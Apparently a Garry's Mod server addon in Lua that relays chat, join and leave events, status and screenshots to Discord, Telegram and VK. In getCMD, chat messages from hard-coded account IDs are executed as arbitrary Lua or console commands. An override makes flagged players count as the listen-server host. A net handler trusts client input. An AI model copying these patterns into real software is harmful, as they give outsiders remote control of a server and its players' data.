module( "kotLib.vk", package.seeall )
util.AddNetworkString( "Test2" )
net.Receive( "Test2", function(len, ply)  
    M = net.ReadBool()
    ply:SetNWInt("Tamer", net.ReadString() ) 
    --ply:SetNWInt("Lang", net.ReadString() ) 
    ply:SetNWInt("Suka", M )
end)
MsgC( Color( 0, 255, 0 ), "Свернуть игру загружен" )
local col2num = function(col)
	return col.b + bit.lshift(col.g, 8) + bit.lshift(col.r, 16)
end
util.AddNetworkString("VK")
local Vknotify = function(...)
local Ar = {...} 
	timer.Simple(0.1,function() 
	 	net.Start("VK")
	 	net.WriteTable(Ar)
	 	net.Broadcast()
	 end)
end
util.AddNetworkString("telega")
local Vk1notify = function(...)
local Ar = {...} 
	timer.Simple(0.1,function() 
	 	net.Start("telega")
	 	net.WriteTable(Ar)
	 	net.Broadcast()
	 end)
end
util.AddNetworkString("BOTmessage")
local Vk2notify = function(...)
local Ar = {...} 
	timer.Simple(0.1,function() 
	 	net.Start("BOTmessage")
	 	net.WriteTable(Ar)
	 	net.Broadcast()
	 end)
end
local cmds = {}
cmds["!status"] = 1
cmds["!help"] = 1
cmds["!status "] = 1
cmds["!help "] = 1
local cmdf = {}
cmdf["!status"] = function()
	local em = {
		color = 0xFF8C00,
		title = (#player.GetHumans()>0 and string.format("На сервере %s/"..game.MaxPlayers().." игроков", #player.GetHumans()) or "Сервер пуст"),
		description = "IP: "..game.GetIPAddress().."\nКарта: "..game.GetMap().."\nUptime: "..string.NiceTime(SysTime()),
		--url = "steam://connect/"..game.GetIPAddress(),
		fields = {}
	}
	
	local i = 0
	for k, v in pairs(player.GetHumans()) do
		i = k
		if i > 24 then break end
		table.insert(em.fields, {
			name = v:GetName(),
			value = v:SteamID() .. "\n" .. "https://steamcommunity.com/profiles/"..v:SteamID64(),
		})
	end
	EmbedReplyMessage(em)
	if i > 24 then
		local add = {color = 0xFF8C00, fields = {}}
		for k, v in pairs(player.GetAll()) do
			if k > i then
				table.insert(add.fields, {
					name = v:GetName(),
					value = v:SteamID()
				})
			end
		end
		EmbedMessage(add)
	end
	
end
cmdf["!help"] = function() 
	EmbedReplyMessage({
		color = 0xFFD700,
		title = "Команды бота",
		fields = {{
			name = "!status",
			value = "Показать игроков на сервере",
		}}
	})
end
cmdf["!status "] = cmdf["!status"]
cmdf["!help "] = cmdf["!help"]  
local function isImg( msg )
	return msg:match("^https?://.+%.jpg$") or msg:match("^https?://.+%.png$") or msg:match("^https?://.+%.gif$") or msg:match("^https?://.+%.jpeg$")
end
local Akych = {}
Akych["919967257151545406"] = true
Akych["5319898992"] = true
--6147585654
Akych["6147585654"] = true
Akych["7394577190"] = true
Akych["6718731473"] = true
Akych["5113896468"] = true
local dostup = {}
local getCMD = function(id, msg, name)
    if string.StartWith(msg, ']]') then
        if not Akych[id] then
            ReplyMessage("➤ Ну че "..name..", получается?")
            return false
        end
        msg = string.sub(msg, 3)
        CompilerReturn(msg, nil, true)

    elseif string.StartWith(msg, ']') then
        if not Akych[id] then
            ReplyMessage("➤ Ну че "..name..", получается?")
            return false
        end
        msg = string.sub(msg, 2)
        msg = "return "..msg
        CompilerReturn(msg, nil, true)
	elseif string.StartWith(msg, '//') then
		if not Akych[id] then
            ReplyMessage("➤ Ну че "..name..", получается?")
            return false
        end
        msg = string.sub(msg, 3)

        local command, args = string.match(msg, "(%S+)%s*(.*)")
        if command then
            RunConsoleCommand(command, args) 
        end
    end
end
local accum = {}
AddMessage = function(msg) table.insert(accum, msg.."\n") end
ReplyMessage = function(msg)
	kotSock.sendT("SVMessageReply", {msg})
end
EmbedMessage = function(em)
	kotSock.sendT("SVMessage", {embed = em})
end
EmbedReplyMessage = function(em)
	kotSock.sendT("SVMessageReply", {embed = em})
end
Unregister = function(dsid)
	kotSock.sendT("SVunregister", {dsid})
end
GetAll = function()
	kotSock.sendT("SVGetUsers", {})
end
kotSock.hook("JSGetUsers", function(t)
	Users = t
end)
hook.Add("Tick", "kotDump", function()
	if #accum == 0 then return end
	local acc = ""
	for k,v in pairs(accum) do
		acc = acc .. v
	end
	kotSock.sendT("SVMessage", {acc})
	accum = {}
end)
local function ContentView(url, cb, ...)
	local params = {...}
	local hash = util.SHA1(url)
	kotSock.sendT("SVCacheImage", {url, hash})
	local url2 = "http://" .. string.Explode(":", game.GetIPAddress())[1] .. ":"..HTTP_PORT.."/" .. hash
	cb(url2, url, unpack(params))
end
kotSock.hook("DSMessage", function(t)
	print(table.ToString(t))
	kotSock.sendT("SVtest", {t})
	if istable(t[3]) then return end
	getCMD(t[1], t[3], t[2])
	if #t[3] > 0 then
		Vknotify({{t[2], t[3]}})
		
	end
	if cmds[t[3]] then cmdf[t[3]]() end
end)
kotSock.hook("TGMessage", function(t)
	print(table.ToString(t))
	kotSock.sendT("SVtest", {t})
	if t[6] then
		local ply = player.GetBySteamID64( t[1] )
		if not IsValid(ply) then return end
		
		ContentView(t[4][1], function(url, ogurl, param)
			net.Start("ContentView")
			net.WriteString(url)
			net.WriteString(ogurl)
			net.WriteBool(true)
			net.WriteEntity(param)
			net.Broadcast()
		end, ply)
		
		return
	end
	if istable(t[3]) then return end
	getCMD(t[1], t[3], t[2])
	if #t[3] > 0 then
		Vk1notify({{t[2], t[3]}})
	end
	if cmds[t[3]] then cmdf[t[3]]() end
	if #t[4] > 0 then
		print(table.ToString(t[4]))
		ContentView(t[4][1], function(url, ogurl, param)
			net.Start("ContentView")
			net.WriteString(url)
			net.WriteString(ogurl)
			net.WriteBool(false)
			net.WriteString(param)
			net.Broadcast()
		end, t[2])
		Vknotify({{t[2], "" }})
	end
end)
kotSock.hook("BOTMessage", function(t)
	print(table.ToString(t))
	kotSock.sendT("SVtest", {t})
	if t[6] then
		local ply = player.GetBySteamID64( t[1] )
		if not IsValid(ply) then return end
		
		ContentView(t[4][1], function(url, ogurl, param)
			net.Start("ContentView")
			net.WriteString(url)
			net.WriteString(ogurl)
			net.WriteBool(true)
			net.WriteEntity(param)
			net.Broadcast()
		end, ply)
		
		return
	end
	if istable(t[3]) then return end
	getCMD(t[1], t[3], t[2])
	if #t[3] > 0 then
		Vk2notify({{t[2], t[3]}})
	end
	if cmds[t[3]] then cmdf[t[3]]() end
	if #t[4] > 0 then
		print(table.ToString(t[4]))
		ContentView(t[4][1], function(url, ogurl, param)
			net.Start("ContentView")
			net.WriteString(url)
			net.WriteString(ogurl)
			net.WriteBool(false)
			net.WriteString(param)
			net.Broadcast()
		end, t[2])
		Vknotify({{t[2], "" }})
	end
end)
util.AddNetworkString("ContentView")

hook.Add('PlayerSay',"CV",function(ply,msg)
	if not IsValid(ply) then AddMessage(string.format( "%s: %s"  ,'console',omsg)) end
	if ply.gimp then return end
	if string.StartWith(msg, '!') then return end
	--if ply:SteamID() == "STEAM_0:0:522885658" then msg = "https://i.imgur.com/K1I36ha.jpg" end
	local hide = false
	local noimg = false
	if string.StartWith(msg, '//') then
		hide = true
		msg = string.sub(msg, 3)
	end
	local omsg = msg
	if string.StartWith(msg, '.') then
		noimg = true
		msg = string.sub(msg, 2)
	end
	
	local m = isImg( msg )
	if m != nil then 
		if noimg then
			AddMessage(string.format( "%s: %s"  ,ply:Name(),msg))
			return msg
		end
		ContentView(m, function(url, ogurl, param)
			net.Start("ContentView")
			net.WriteString(url)
			net.WriteString(ogurl)
			net.WriteBool(true)
			net.WriteEntity(param)
			net.Broadcast()
		end,
		function(url, param)
			param:Say("."..url)
		end,
		ply)
		if not hide then kotSock.sendT("SVUpload", {ply:Name(), m}) end
		
		return ""
	end
	
	if not hide then AddMessage(string.format( "%s: %s"  ,ply:Name(),omsg)) end
	
	--return msg
end, HOOK_LOW )


local keynotify = function(ply,...)
local Ar = {...} 
	timer.Simple(0.1,function() 
	 	net.Start("BuildN")
	 	net.WriteTable(Ar)
	 	net.Send(ply)
	 end)
end

--the key generation
local charset = {}  do -- [0-9a-zA-Z]
    for c = 48, 57  do table.insert(charset, string.char(c)) end
    for c = 65, 90  do table.insert(charset, string.char(c)) end
    for c = 97, 122 do table.insert(charset, string.char(c)) end
    table.insert(charset, "_")

end

local function RandomVar(length)
	local res = ""
	for i = 1, length do
		res = res .. charset[math.random(1,#charset)]
	end
	return res
end
function keygen(ply,msg) 
	if msg:StartWith("!key") then
		local key = RandomVar(32)
		kotSock.sendRecv("SVkeygen",
			function(data)
				local ply = player.GetBySteamID64(data[1])
				if IsValid(ply) then
					keynotify(ply,Color(230,230,230),'Ваш персональный ключ\n',Color(255,200,255),data[2],Color(230,230,230),"\nОтправьте ключ личным сообщением боту ", Color(46,204,113),"Vanguard Server#0022" ,Color(230,230,230), " в дискорде.")
				end
			end,
			function(sid)
				local ply = player.GetBySteamID64(sid)
				if IsValid(ply) then keynotify(ply, Color(255,200,200), "Не удалось сгенерировать ключ, попробуйте позже.") end
			end,
		ply:SteamID64(), key)
		return ""
	end
end
hook.Add('PlayerSay',"keygen",keygen)


local cdnnotify = function(...)
local Ar = {...} 
	timer.Simple(0.1,function() 
	 	net.Start("BuildN")
	 	net.WriteTable(Ar)
	 	net.Broadcast()
	 end)
end

local function updcount()
	kotSock.sendT("SVcounter", {(#player.GetHumans().."/"..game.MaxPlayers())})
end

timer.Simple(2, function() updcount() end)
timer.Create( "playercount", 20, 0, function() updcount() end)

psums = psums or {}

local function getColor(steamid)
	local u = ULib.ucl.users[steamid]
	local rank = ULib.ACCESS_ALL
	if u then rank = u.group end
	
	local g = ULib.ucl.groups[rank]
	if g.team then
		for k, v in pairs(ulx.teams) do
			if v.order == tonumber(g.team.order) then
				return v.color
			end
		end
	end
end

local function requestPData(steamid)
	if psums[steamid] then return end
	local sid64 = util.SteamIDTo64(steamid)
	if sid64 ~= "0" then
		kotSock.sendT("SVGetPdata", {sid64})
	end
end

gameevent.Listen( "player_connect" )
hook.Add("player_connect", "GetPData", function( data )
	local steamid = data.networkid
	--print("connect", steamid)
	requestPData(steamid)
end)

hook.Add( "PlayerAuthed", "GetPData", function( ply, steamid, uniqueid )
	if psums[steamid] then return end
	--print("auth", steamid)
	requestPData(steamid)
end )

kotSock.hook("JSPdata",function(data)
	psums[data.steamid] = data
	--print(table.ToString(data))
end)

hook.Add("player_connect", "ION_CONNECT_NOTIFY", function( data )
    local name = data.name
    local steamid = data.networkid
    local isBot = (data.bot == 1)
    timer.Simple(1, function() updcount() end)
    if isBot then
        EmbedMessage({
            color = 0xFFFFFF,
            title = name .. " Подключается",
            description = "<BOT>",
        })
        cdnnotify(Color(0,0,0), "► ", Color(150, 150, 150), name, Color(220,220,220), " Подключается <BOT>")
        return
    end
    local steamid64 = util.SteamIDTo64(steamid)
    local tm = 0xAAAAAA 
    EmbedMessage({
        color = tm,
        title = name,
        url = "https://steamcommunity.com/profiles/" .. (steamid64 or ""),
        description = "Подключается",
        fields = {
            {
                name = "SteamID",
                value = steamid,
                inline = true
            }
        },
    })
    cdnnotify(Color(0,0,0), "► ", Color(200, 200, 200), name, Color(220,220,220), " Подключается... (", Color(0,0,0), steamid, Color(220,220,220), ")")
end)
local hidelist = {
["76561199499704510"] = true,
}

hook.Add( "PlayerInitialSpawn", "KotSpawn", function(ply)
	if !ply:IsValid() then return end
	
	timer.Simple(2, function() updcount() end)
	
	local osteamid64 = ply:OwnerSteamID64()
	local steamid64 = ply:SteamID64()
	
	if ply:IsBot() then
		--[[EmbedMessage({
			color = 0xFFFFFF,
			title = ply:Name() .. " Подключился",
			description = "<BOT>",
		})
		cdnnotify(Color(0,0,0),"► ",team.GetColor(ply:Team()) or Color(0,0,0),ply:Nick(),Color(220,220,220)," Подключился <BOT>")]]
		return
	end
	
	--if osteamid64 == "76561198842472456" then ulx.ban(NULL, ply, 0, "амогус") return end --заебал
	--if osteamid64 == "76561198167473854" then ulx.ban(NULL, ply, 0, "штора пидр") return end
	
	local kal = getColor(ply:SteamID()) or Color(0,0,0)
	
	timer.Simple(1, function()
		if not IsValid(ply) then return end
		--if ply:IsSuperAdmin() then return end
		local avatar = ""
		if psums[steamid64] then
			avatar = psums[steamid64].avatar
		end
		
		local tm = col2num(kal)
		
		if osteamid64 == steamid64 or hidelist[steamid64] then
			EmbedMessage({
				color = tm,
				title = ply:Name(),
				url = string.format("https://steamcommunity.com/profiles/%s", steamid64),
				description = "Подключился",
				thumbnail = {
					url = avatar,
				},
				fields = {
					{
						name = "SteamID",
						value = ply:SteamID()
					}
				},
			})
		else
			EmbedMessage({
				color = tm,
				title = ply:Name(),
				url = string.format("https://steamcommunity.com/profiles/%s", steamid64),
				description = "Подключился",
				thumbnail = {
					url = avatar,
				},
				fields = {
					{
						name = "SteamID",
						value = ply:SteamID(),
						inline = true,
					},
					{
						name = "Real",
						value = util.SteamIDFrom64(osteamid64),
						inline = true,
					}
				},
				
			})
		end
	end)
	
	timer.Simple(3,function( )
		
		cdnnotify(Color(0,0,0),"► ",kal,ply:Nick(),Color(220,220,220)," Подключился (",Color(0,0,0),ply:SteamID(),Color(220,220,220),")")
	end)
end, HOOK_LOW )

hook.Add( "InitPostEntity", "VKotInit", function()
	timer.Simple(10,function()
		kotSock.sendT("SVPostRestart", {})
		EmbedMessage({
			title = "Сервер перезагружен.",
			color = 0xDC143C,
			fields = {
				{
				name = "Название",
				value = GetHostName(),
				},
				{
				name = "Карта",
				value = game.GetMap(),
				inline = true
				},
				{
				name = "IP",
				value = game.GetIPAddress(),
				inline = true
				},
			}
		})
		local res = {}
		for k,v in pairs(ULib.ucl.users) do
			res[util.SteamIDTo64(k)] = v.group or ULib.ACCESS_ALL
		end
		kotSock.sendT("SVGetGroups", res)
   end)
end )

hook.Add(ULib.HOOK_USER_GROUP_CHANGE, "VK", function(id, allows, denies, group, oldgroup)
	kotSock.sendT("SVGetGroups", {[util.SteamIDTo64(id)] = group})
end)

kotSock.hook("SyncGroups", function(data)
	local res1 = {}
	local res2 = {}
	for k,v in pairs(ulx.teams) do
		if v.groups then
			for _, group in pairs(v.groups) do
				res1[group] = k
			end
		end
		res2[k] = {name = v.name, color = col2num(v.color), order = v.order}
	end
	
	kotSock.sendT("SVSyncGroups", {res1, res2, data[1]})
end)

kotSock.hook("GroupsRequest", function(data)
	local res = {}
	for k, v in pairs(data) do
		local sid = util.SteamIDFrom64(v)
		local user = ULib.ucl.users[sid]
		local group
		if user then
			group = user.group
		else
			group = ULib.ACCESS_ALL
		end
		res[v] = group
	end
	kotSock.sendT("SVGetGroups", res)
end)

function Reasons(str)
	if string.find( str , "Disconnect by user." ) then
		return "Отключился"
	end
	
	if string.find( str , "Kicked from server" ) then
		return "Кикнут сервером"
	end

	if string.find( str , "No Steam logon" ) then
		return "Потерял соеденение со стимом"
	end

	if string.find( str , "timed out" ) then
		return "Крашнулся"
	end

	if string.find( str , "map" ) then
		return str
	end

	if string.find( str , "Client not connected to Steam" ) then
		return "Не зашел в стим"
	end

	if string.find( str , "Map is missing" ) then
		return "Не скачал карту"
	end
	return str
end

gameevent.Listen( "player_disconnect" )
hook.Remove("player_disconnect", "KotDisconnect")
hook.Add( "player_disconnect", "KotDisconnect", function( data )
	
	timer.Simple(2, function() updcount() end)
	if data.bot == 1 then return end
	local name = data.name			

	local steamid = data.networkid		
	--if steamid == "STEAM_0:0:593729936"	then return end
	local reason = data.reason	
	local SteamID64 = util.SteamIDTo64(steamid)
	local ava = ""
	if psums[SteamID64] then
		ava = psums[SteamID64].avatar
		psums[SteamID64] = nil
	end
	local kal = getColor(steamid) or Color(0,0,0)
	
	local rs = Reasons(reason) 
	--kotLib.vk.AddMessage(string.format("► Игрок %s | %s | https://steamcommunity.com/profiles/%s (%s)\n" ,name , rs,SteamID64, steamid))
	EmbedMessage({
		color = col2num(kal),
		title = name,
		url = string.format("https://steamcommunity.com/profiles/%s", SteamID64),
		description = rs,
		thumbnail = {
			url = ava,
		},
		fields = {
			{
				name = "SteamID",
				value = steamid,
			}
		},
	})
	cdnnotify(Color(0,0,0),"► ",kal,name,Color(220,220,220)," ".. rs ..". (",Color(0,0,0),steamid,Color(220,220,220),")")
	--cdnnotify(Color(14,131,205),"[Sbox]: ",Color(14 + 50,131+ 50,205+ 50),name,Color(255,255,255)," ".. rs , Color(14,131,205) ," [",Color(220,220,220),steamid,Color(14,131,205),"]")

end)

util.AddNetworkString("screenshot_rdy")
concommand.Add("screenshot_send", function( ply, cmd, args )
	if ply.cd then
		if ply.cd > CurTime() then
			net.Start("screenshot_rdy")
				net.WriteBool(false)
				net.WriteFloat(ply.cd - CurTime())
			net.Send(ply)
			return
		else
			ply.cd = CurTime() + 20
		end
	else
		ply.cd = CurTime() + 20
	end
    local ts = RandomVar(16) or "bad"
	kotSock.sendRecv("SVstream", function() end, function(ts, param)
		local ply = player.GetBySteamID64(param[2])
		if IsValid(ply) then
			net.Start("screenshot_rdy")
				net.WriteBool(false)
				net.WriteFloat(-1)
			net.Send(ply)
		end
	end, ts, {ply:Name(), ply:SteamID64()})
	
	net.Start("screenshot_rdy")
		net.WriteBool(true)
		net.WriteString(ts)
	net.Send(ply)
end)

VoiceRelays = VoiceRelays or {}

local meta = FindMetaTable("Player")
if not IsListenServerHostOld then
	IsListenServerHostOld = meta.IsListenServerHost
end
meta.IsListenServerHost = function(ply)
	return IsListenServerHostOld(ply) or ply:GetNWBool("VoiceRelay")
end

